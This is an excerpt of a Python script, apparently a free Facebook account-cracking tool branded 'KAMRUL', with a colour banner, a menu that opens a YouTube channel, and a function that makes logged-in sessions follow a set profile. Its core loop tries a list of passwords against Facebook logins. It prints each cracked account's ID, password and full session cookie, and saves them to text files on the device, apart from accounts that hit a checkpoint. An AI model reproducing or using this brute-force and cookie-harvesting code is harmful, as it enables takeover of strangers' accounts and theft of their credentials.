...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtube.com/channel/kamrulislam-y8p?si=tl5dqAezY4xTUqcz')
        FD()
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100089854232814'), {
...
\033[1;37m================= \33[32;45mKAMRUL \33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mKAMRUL \33[0;m\033[1;32m && \033[1;33mKAMRUL \33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m KAMRUL 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mARIYAN5050
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mKML
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(KAMRUL -OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/KAMRUL -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(KAMRUL -CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/KAMRUL -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[KAMRUL ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
